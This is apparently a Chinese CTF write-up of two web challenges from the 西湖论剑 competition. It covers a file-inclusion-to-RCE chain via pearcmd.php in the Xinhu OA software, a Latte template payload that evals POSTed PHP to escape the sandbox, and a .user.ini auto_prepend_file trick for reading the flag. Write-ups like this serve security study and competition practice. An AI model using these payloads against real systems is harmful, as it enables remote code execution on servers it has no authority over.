# 西湖论剑WEB



## web1

信呼0day，审了一天真的人都麻了，当时一直看各种API看完结果最后不是根据API进行RCE【下午的时候其实想到了可能是文件包含，但是那时候已经过了三四个小时了，脑子乱了哎】



![image-20211122134613814](https://gitee.com/yyssllz/pic/raw/master/image-20211122134613814.png)



通过控制可以包含任意php文件，包含pearcmd.php进行RCE即可，注意这里他的base64和你直接base64是不一样的，所以 需要你自己写个测试的地方然后把结果输出出来。

![image-20211122135531003](https://gitee.com/yyssllz/pic/raw/master/image-20211122135531003.png)

在这里填写你想要的即可。



## web2

两个做法，一个做法是直接上传index.latte覆盖他的模板文件，第二个做法是通过上传.user.ini，只会再通过审计源码找到缓存文件即可

### 做法一

上传index.latte覆盖即可（这个和smarty那个的绕过思路很像，有意思）

```latte
{if "${eval($_POST[0])}"}{/if}
```

jiang师傅太牛啦，这个主要是通过if条件判断让框架把你的东西识别为字符串处理，这样就可以绕过沙盒的限制，直接打RCE，非常有意思【所以这题改改nu1l的师傅们的做法就用不了了



### 做法二

这个就是网上流传的通解，利用auto_prepend_file=/flag ，上传user.ini，进行文件读取。

![image-20211122105542600](https://gitee.com/yyssllz/pic/raw/master/image-20211122105542600.png)

需要注意的就是这里的缓存文件名的规律，这个只需要你保证版本一样即可。
